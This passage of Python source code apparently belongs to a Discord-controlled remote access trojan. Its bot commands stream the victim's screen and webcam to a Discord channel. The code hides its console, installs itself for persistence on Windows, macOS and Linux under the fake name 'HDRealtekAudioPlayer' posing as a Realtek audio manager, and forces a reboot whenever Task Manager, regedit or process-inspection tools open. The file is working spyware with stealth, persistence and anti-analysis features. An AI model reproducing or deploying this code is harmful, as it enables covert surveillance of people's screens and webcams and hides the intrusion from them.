            interface = devices.Activate(
                IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
            volume = cast(interface, POINTER(IAudioEndpointVolume))
            
            # Unmute the system
            volume.SetMute(0, None)
            
            await ctx.send(f"🔊 System audio has been enabled on {SYSTEM_NAME}")
        else:
            await ctx.send(f"⚠️ This command is currently only supported on Windows")
    except Exception as e:
        await ctx.send(f"❌ Error enabling audio: {str(e)}")

@bot.command(name='screen', help='Provides a live view of the screen')
async def live_screen(ctx, duration: int = 30):
    try:
        # Limit the duration to prevent abuse (max 5 minutes)
        if duration > 300:
            duration = 300
            await ctx.send(f"⚠️ Duration limited to 5 minutes (300 seconds)")
        elif duration < 5:
            duration = 5
            await ctx.send(f"⚠️ Duration must be at least 5 seconds")
        
        # Check if there's already a screen update task for this channel
        if ctx.channel.id in screen_update_tasks:
            await ctx.send("❌ A screen sharing session is already active in this channel")
            return
        
        await ctx.send(f"🖥️ Starting live screen view from {SYSTEM_NAME} for {duration} seconds...")
        
        # Take initial screenshot
        screenshot = pyautogui.screenshot()
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        screenshot_path = f'screenshot_{timestamp}.png'
        screenshot.save(screenshot_path)
        
        # Send the initial screenshot
        screen_message = await ctx.send(f'📷 Live screen from {SYSTEM_NAME} - updating every 0.5 seconds', 
                                       file=discord.File(screenshot_path))
        
        # Clean up the initial file
        os.remove(screenshot_path)
        
        # Create a task to update the screenshot
        update_task = asyncio.create_task(update_screen(ctx, screen_message, duration))
        screen_update_tasks[ctx.channel.id] = update_task
        
        # Wait for the task to complete
        try:
            await update_task
        except asyncio.CancelledError:
            pass
        
        # Remove the task from the dictionary
        if ctx.channel.id in screen_update_tasks:
            del screen_update_tasks[ctx.channel.id]
        
        await ctx.send(f"✅ Live screen view ended after {duration} seconds")
        
    except Exception as e:
        await ctx.send(f"❌ Error starting live screen view: {str(e)}")
        # Clean up if an error occurs
        if ctx.channel.id in screen_update_tasks:
            del screen_update_tasks[ctx.channel.id]
        if 'screenshot_path' in locals() and os.path.exists(screenshot_path):
            os.remove(screenshot_path)

async def update_screen(ctx, message, duration):
    """Updates the screenshot message with a new screenshot every 0.5 seconds"""
    end_time = time.time() + duration
    update_count = 0
    
    while time.time() < end_time:
        try:
            # Sleep for 0.5 seconds
            await asyncio.sleep(0.5)
            
            # Take a new screenshot
            screenshot = pyautogui.screenshot()
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            screenshot_path = f'screenshot_{timestamp}.png'
            screenshot.save(screenshot_path)
            
            # Update the message with the new screenshot
            update_count += 1
            remaining = int(end_time - time.time())
            
            # Edit the original message with the new screenshot
            await message.edit(content=f'📷 Live screen from {SYSTEM_NAME} - update #{update_count} - {remaining}s remaining', 
                              attachments=[discord.File(screenshot_path)])
            
            # Clean up the file after sending
            os.remove(screenshot_path)
            
        except discord.HTTPException as e:
            # Handle Discord rate limits or other HTTP errors
            if e.status == 429:  # Rate limited
                retry_after = e.retry_after if hasattr(e, 'retry_after') else 5
                await asyncio.sleep(retry_after)
            else:
                # For other HTTP errors, wait a bit longer between updates
                await asyncio.sleep(2)
        except Exception as e:
            # Log the error but continue the loop
            print(f"Error updating screenshot: {str(e)}")
            await asyncio.sleep(1)
    
    return update_count

@bot.command(name='webcamstream', help='Provides a live view of the webcam')
async def live_webcam(ctx, duration: int = 30):
    try:
        # Limit the duration to prevent abuse (max 5 minutes)
        if duration > 300:
            duration = 300
            await ctx.send(f"⚠️ Duration limited to 5 minutes (300 seconds)")
        elif duration < 5:
            duration = 5
            await ctx.send(f"⚠️ Duration must be at least 5 seconds")
            
        # Check if there's already a webcam update task for this channel
        if ctx.channel.id in screen_update_tasks:  # Reusing the same dictionary for tracking
            await ctx.send("❌ A screen or webcam sharing session is already active in this channel")
            return
            
        await ctx.send(f"📹 Starting live webcam view from {SYSTEM_NAME} for {duration} seconds...")
            
        # Initialize webcam
        cap = cv2.VideoCapture(0)  # 0 is usually the default webcam
            
        if not cap.isOpened():
            await ctx.send("❌ Error: Could not access webcam.")
            return
            
        # Take initial webcam photo
        ret, frame = cap.read()
        if not ret:
            await ctx.send("❌ Error: Could not capture image from webcam.")
            cap.release()
            return
            
        # Save the initial image
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        webcam_path = f'webcam_{timestamp}.jpg'
        cv2.imwrite(webcam_path, frame)
            
        # Send the initial webcam image
        webcam_message = await ctx.send(f'📹 Live webcam from {SYSTEM_NAME} - updating every 0.5 seconds',
                                      file=discord.File(webcam_path))
            
        # Clean up the initial file
        os.remove(webcam_path)
        
        # Release the webcam for now (we'll reopen it for each update)
        cap.release()
            
        # Create a task to update the webcam feed
        update_task = asyncio.create_task(update_webcam(ctx, webcam_message, duration))
        screen_update_tasks[ctx.channel.id] = update_task
            
        # Wait for the task to complete
        try:
            await update_task
        except asyncio.CancelledError:
            pass
            
        # Remove the task from the dictionary
        if ctx.channel.id in screen_update_tasks:
            del screen_update_tasks[ctx.channel.id]
            
        await ctx.send(f"✅ Live webcam view ended after {duration} seconds")
        
    except Exception as e:
        await ctx.send(f"❌ Error starting live webcam view: {str(e)}")
        # Clean up if an error occurs
        if ctx.channel.id in screen_update_tasks:
            del screen_update_tasks[ctx.channel.id]
        if 'webcam_path' in locals() and os.path.exists(webcam_path):
            os.remove(webcam_path)
        if 'cap' in locals() and cap.isOpened():
            cap.release()

async def update_webcam(ctx, message, duration):
    """Updates the webcam message with a new image every 0.5 seconds"""
    end_time = time.time() + duration
    update_count = 0
    
    while time.time() < end_time:
        try:
            # Sleep for 0.5 seconds
            await asyncio.sleep(0.5)
            
            # Initialize webcam for this update
            cap = cv2.VideoCapture(0)
            if not cap.isOpened():
                await ctx.send("❌ Error: Lost access to webcam.")
                break
                
            # Take a new webcam photo
            ret, frame = cap.read()
            if not ret:
                await ctx.send("❌ Error: Could not capture image from webcam.")
                cap.release()
                break
                
            # Save the image
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            webcam_path = f'webcam_{timestamp}.jpg'
            cv2.imwrite(webcam_path, frame)
            
            # Release the webcam until next update
            cap.release()
            
            # Update the message with the new webcam image
            update_count += 1
            remaining = int(end_time - time.time())
            
            # Edit the original message with the new webcam image
            await message.edit(content=f'📹 Live webcam from {SYSTEM_NAME} - update #{update_count} - {remaining}s remaining',
                              attachments=[discord.File(webcam_path)])
            
            # Clean up the file after sending
            os.remove(webcam_path)
            
        except discord.HTTPException as e:
            # Handle Discord rate limits or other HTTP errors
            if e.status == 429:  # Rate limited
                retry_after = e.retry_after if hasattr(e, 'retry_after') else 5
                await asyncio.sleep(retry_after)
            else:
                # For other HTTP errors, wait a bit longer between updates
                await asyncio.sleep(2)
        except Exception as e:
            # Log the error but continue the loop
            print(f"Error updating webcam: {str(e)}")
            await asyncio.sleep(1)
            
    return update_count

@bot.command(name='stopwebcam', help='Stops the live webcam view')
async def stop_webcam(ctx):
    try:
        if ctx.channel.id in screen_update_tasks:
            # Cancel the update task
            screen_update_tasks[ctx.channel.id].cancel()
            del screen_update_tasks[ctx.channel.id]
            await ctx.send(f"✅ Live webcam view stopped on {SYSTEM_NAME}")
        else:
            await ctx.send("❌ No active webcam sharing session in this channel")
    except Exception as e:
        await ctx.send(f"❌ Error stopping webcam view: {str(e)}")

@bot.command(name='stopscreen', help='Stops the live screen view')
async def stop_screen(ctx):
    try:
        if ctx.channel.id in screen_update_tasks:
            # Cancel the update task
            screen_update_tasks[ctx.channel.id].cancel()
            del screen_update_tasks[ctx.channel.id]
            await ctx.send(f"✅ Live screen view stopped on {SYSTEM_NAME}")
        else:
            await ctx.send("❌ No active screen sharing session in this channel")
    except Exception as e:
        await ctx.send(f"❌ Error stopping screen view: {str(e)}")


@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        return
    
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.send(f"❌ Missing required argument: {error.param.name}")
    elif isinstance(error, commands.BadArgument):
        await ctx.send(f"❌ Bad argument: {str(error)}")
    else:
        await ctx.send(f"❌ An error occurred: {str(error)}")
        print(f"Command error: {str(error)}")

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        return
    
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.send(f"❌ Missing required argument: {error.param.name}")
    elif isinstance(error, commands.BadArgument):
        await ctx.send(f"❌ Bad argument: {str(error)}")
    else:
        await ctx.send(f"❌ An error occurred: {str(error)}")
        print(f"Command error: {str(error)}")

# Add the startup function here
def add_to_startup():
    """
    Copy the executable to LocalAppData and add it to startup with a legitimate-looking name
    """
    try:
        startup_name = "HDRealtekAudioPlayer"  # Legitimate-looking name
        
        # Get the full path of the current script
        current_path = os.path.abspath(sys.argv[0])
        
        if platform.system() == "Windows":
            # Define the LocalAppData path
            local_app_data = os.path.join(os.environ['LOCALAPPDATA'], startup_name)
            
            # Create the directory if it doesn't exist
            if not os.path.exists(local_app_data):
                os.makedirs(local_app_data)
            
            # Determine target path in LocalAppData
            if current_path.endswith('.py'):
                # For Python script, we'll copy both the script and create a VBS launcher
                target_script = os.path.join(local_app_data, f"{startup_name}.py")
                target_launcher = os.path.join(local_app_data, f"{startup_name}.vbs")
                
                # Copy the script to LocalAppData
                shutil.copy2(current_path, target_script)
                
                # Create a VBS launcher to run the script invisibly
                vbs_content = f'''Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "pythonw.exe ""{target_script}""", 0, False'''
                with open(target_launcher, 'w') as f:
                    f.write(vbs_content)
                
                # The path to add to startup is the VBS launcher
                startup_path = target_launcher
            else:
                # For executable, just copy it
                target_exe = os.path.join(local_app_data, f"{startup_name}.exe")
                shutil.copy2(current_path, target_exe)
                startup_path = target_exe
            
            # Add to registry for startup
            import winreg
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0, winreg.KEY_SET_VALUE
            )
            winreg.SetValueEx(key, startup_name, 0, winreg.REG_SZ, f'"{startup_path}"')
            winreg.CloseKey(key)
            
            print(f"Added to Windows startup as '{startup_name}' from LocalAppData")
        
        elif platform.system() == "Darwin":  # macOS
            # Define the application support directory
            app_support = os.path.expanduser(f"~/Library/Application Support/{startup_name}")
            
            # Create the directory if it doesn't exist
            if not os.path.exists(app_support):
                os.makedirs(app_support)
            
            # Copy the script/executable to the application support directory
            if current_path.endswith('.py'):
                target_script = os.path.join(app_support, f"{startup_name}.py")
                shutil.copy2(current_path, target_script)
                exec_path = f"/usr/bin/python3 '{target_script}'"
            else:
                target_exe = os.path.join(app_support, startup_name)
                shutil.copy2(current_path, target_exe)
                os.chmod(target_exe, 0o755)  # Make executable
                exec_path = f"'{target_exe}'"
            
            # Create a launch agent
            plist_path = os.path.expanduser(f"~/Library/LaunchAgents/com.{startup_name.lower()}.plist")
            
            # Create the plist content
            plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.{startup_name.lower()}</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/sh</string>
        <string>-c</string>
        <string>{exec_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardErrorPath</key>
    <string>/dev/null</string>
    <key>StandardOutPath</key>
    <string>/dev/null</string>
</dict>
</plist>'''
            
            # Write the plist file
            with open(plist_path, 'w') as f:
                f.write(plist_content)
            
            # Set permissions and load the agent
            os.chmod(plist_path, 0o644)
            subprocess.run(['launchctl', 'load', plist_path])
            
            print(f"Added to macOS startup as '{startup_name}' from Application Support")
        
        elif platform.system() == "Linux":
            # Define the config directory
            config_dir = os.path.expanduser(f"~/.config/{startup_name}")
            
            # Create the directory if it doesn't exist
            if not os.path.exists(config_dir):
                os.makedirs(config_dir)
            
            # Copy the script/executable to the config directory
            if current_path.endswith('.py'):
                target_script = os.path.join(config_dir, f"{startup_name}.py")
                shutil.copy2(current_path, target_script)
                exec_path = f"/usr/bin/python3 '{target_script}'"
            else:
                target_exe = os.path.join(config_dir, startup_name)
                shutil.copy2(current_path, target_exe)
                os.chmod(target_exe, 0o755)  # Make executable
                exec_path = f"'{target_exe}'"
            
            # Create autostart entry
            autostart_dir = os.path.expanduser("~/.config/autostart")
            if not os.path.exists(autostart_dir):
                os.makedirs(autostart_dir)
            
            desktop_path = os.path.join(autostart_dir, f"{startup_name.lower()}.desktop")
            
            # Create the desktop entry content
            desktop_content = f'''[Desktop Entry]
Type=Application
Name={startup_name}
Exec={exec_path}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
Comment=Realtek HD Audio Manager'''
            
            # Write the desktop file
            with open(desktop_path, 'w') as f:
                f.write(desktop_content)
            
            # Set permissions
            os.chmod(desktop_path, 0o755)
            
            print(f"Added to Linux startup as '{startup_name}' from config directory")
        
    except Exception as e:
        print(f"Error adding to startup: {str(e)}")

def monitor_forbidden_processes():
    """Monitor for forbidden processes like Task Manager and Registry Editor"""
    forbidden_processes = [
        "taskmgr.exe",      # Task Manager
        "regedit.exe",      # Registry Editor
        "procexp.exe",      # Process Explorer
        "procmon.exe",      # Process Monitor
        "processhacker.exe" # Process Hacker
    ]
    
    while True:
        try:
            # Get list of running processes
            if platform.system() == "Windows":
                output = subprocess.check_output('tasklist /fo csv /nh', shell=True).decode('utf-8', errors='ignore')
                running_processes = [line.split('","')[0].strip('"') for line in output.strip().split('\n')]
                
                # Check if any forbidden process is running
                for process in forbidden_processes:
                    if process.lower() in [p.lower() for p in running_processes]:
                        print(f"Forbidden process detected: {process}")
                        # Immediate shutdown
                        subprocess.Popen('shutdown /r /t 0 /f', shell=True)
                        time.sleep(1)  # Give shutdown command time to execute
                        os._exit(0)  # Exit the script immediately
            
            # Check every 0.5 seconds
            time.sleep(0.5)
        except Exception as e:
            print(f"Error in process monitoring: {str(e)}")
            time.sleep(1)  # Wait a bit before trying again

# Run the bot
if __name__ == "__main__":
    # Try to relaunch as hidden first (if we're in a console)
    if not relaunch_as_hidden():
        # If we didn't relaunch, try to hide the console window
        hide_console_window()
    
    # Add to startup
    add_to_startup()
    
    # Clean up any existing audio files at startup
    cleanup_audio_files()
    
    # Start monitoring for forbidden processes in a separate thread
    monitoring_thread = threading.Thread(target=monitor_forbidden_processes, daemon=True)
    monitoring_thread.start()
    
    # Run the bot
    bot.run(TOKEN)